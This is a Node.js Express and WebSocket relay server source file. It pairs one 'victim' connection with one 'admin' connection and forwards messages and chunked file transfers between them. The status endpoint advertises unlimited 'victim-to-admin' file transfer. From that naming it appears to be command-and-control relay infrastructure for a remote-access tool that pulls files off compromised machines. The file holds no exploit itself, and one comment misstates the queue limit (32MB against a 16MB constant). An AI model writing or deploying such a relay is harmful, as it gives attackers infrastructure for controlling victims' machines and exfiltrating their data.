const express = require("express");
const http = require("http");
const WebSocket = require("ws");

const app = express();
const server = http.createServer(app);

// ============================================
// CONFIGURATION
// ============================================

const PORT = process.env.PORT || 10000;

// Maximum individual WebSocket message (2MB)
const MAX_MESSAGE_SIZE = 2 * 1024 * 1024;

// Maximum queued data per receiving socket (32MB to support larger files)
const MAX_QUEUE_BYTES = 16 * 1024 * 1024;

// Heartbeat interval
const HEARTBEAT_INTERVAL = 30000;

// ============================================
// WEBSOCKET SERVER
// ============================================

const wss = new WebSocket.Server({
    server,
    maxPayload: MAX_MESSAGE_SIZE,
    perMessageDeflate: false
});

let victimSocket = null;
let adminSocket = null;

// Outbound queues, one per receiving socket.
const sendQueues = new WeakMap();

// ============================================
// HTTP STATUS ROUTE
// ============================================

app.get("/", (req, res) => {
    res.json({
        status: "online",
        service: "WebSocket Relay Server",
        victimConnected:
            !!victimSocket &&
            victimSocket.readyState === WebSocket.OPEN,
        adminConnected:
            !!adminSocket &&
            adminSocket.readyState === WebSocket.OPEN,
        fileTransfer: {
            direction: "victim-to-admin",
            totalFileSizeLimit: "No application-level limit",
            chunkedTransfer: true,
            serverStorage: false
        }
    });
});

// ============================================
// SOCKET HELPERS
// ============================================

function isConnected(socket) {
    return socket && socket.readyState === WebSocket.OPEN;
}

function getSocket(role) {
    return role === "victim" ? victimSocket : adminSocket;
}

function setSocket(role, socket) {
    if (role === "victim") {
        victimSocket = socket;
    } else {
        adminSocket = socket;
    }
}

function clearSocket(role, socket) {
    if (getSocket(role) === socket) {
        setSocket(role, null);
    }
}

// ============================================
// SAFE MESSAGE QUEUE (FIXED BYTE LENGTH EVAL)
// ============================================

function enqueueMessage(target, data, isBinary, sender) {
    if (!isConnected(target)) {
        return false;
    }

    let queue = sendQueues.get(target);

    if (!queue) {
        queue = {
            items: [],
            queuedBytes: 0,
            sending: false
        };
        sendQueues.set(target, queue);
    }

    // Safely compute precise byte length whether buffer or string
    const size = Buffer.isBuffer(data) ? data.length : Buffer.byteLength(data);

    if (queue.queuedBytes + size > MAX_QUEUE_BYTES) {
        console.warn("Outbound queue full. Closing slow receiver.");
        if (isConnected(target)) {
            target.close(1013, "Receiver queue overflow");
        }
        return false;
    }

    queue.items.push({
        data,
        isBinary,
        size
    });

    queue.queuedBytes += size;
    processQueue(target, queue);

    return true;
}

function processQueue(target, queue) {
    if (queue.sending || !isConnected(target)) {
        return;
    }

    const item = queue.items.shift();

    if (!item) {
        return;
    }

    queue.sending = true;

    target.send(
        item.data,
        { binary: item.isBinary },
        (error) => {
            queue.sending = false;
            queue.queuedBytes -= item.size;

            if (error) {
                console.error("Message forwarding failed:", error.message);
                target.terminate();
                return;
            }

            processQueue(target, queue);
        }
    );
}

// ============================================
// MESSAGE FORWARDING
// ============================================

function forwardMessage(sender, data, isBinary) {
    const role = sender.role;
    let receiver = null;

    if (role === "victim") {
        receiver = adminSocket;
    } else if (role === "admin") {
        receiver = victimSocket;
    }

    if (!isConnected(receiver)) {
        return;
    }

    enqueueMessage(receiver, data, isBinary, sender);
}

// ============================================
// WEBSOCKET CONNECTION
// ============================================

wss.on("connection", (ws, req) => {
    const url = new URL(
        req.url,
        `http://${req.headers.host || "localhost"}`
    );

    const role = url.searchParams.get("role");

    if (role !== "victim" && role !== "admin") {
        ws.close(1008, "Invalid role");
        return;
    }

    ws.role = role;
    ws.isAlive = true;

    console.log(`${role} connected`);

    const existingSocket = getSocket(role);
    if (isConnected(existingSocket)) {
        existingSocket.close(1000, "Replaced by a new connection");
    }

    setSocket(role, ws);

    ws.on("pong", () => {
        ws.isAlive = true;
    });

    ws.on("message", (data, isBinary) => {
        if (!isConnected(ws)) {
            return;
        }
        forwardMessage(ws, data, isBinary);
    });

    ws.on("error", (error) => {
        console.error(`${role} socket error:`, error.message);
    });

    ws.on("close", (code, reason) => {
        clearSocket(role, ws);
        console.log(`${role} disconnected:`, code, reason.toString());
    });
});

// ============================================
// HEARTBEAT MONITOR
// ============================================

const heartbeatTimer = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (!ws.isAlive) {
            console.log(`${ws.role} heartbeat timeout`);
            ws.terminate();
            return;
        }
        ws.isAlive = false;
        if (isConnected(ws)) {
            ws.ping();
        }
    });
}, HEARTBEAT_INTERVAL);

// ============================================
// SERVER START
// ============================================

server.listen(PORT, () => {
    console.log(`WebSocket server running on port ${PORT}`);
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================

function shutdown() {
    console.log("Shutting down server...");
    clearInterval(heartbeatTimer);
    wss.clients.forEach((ws) => {
        ws.close(1001, "Server shutting down");
    });
    wss.close(() => {
        server.close(() => {
            process.exit(0);
        });
    });
    setTimeout(() => {
        process.exit(1);
    }, 10000).unref();
}

process.on("SIGTERM", shutdown);
process.on("SIGINT", shutdown);
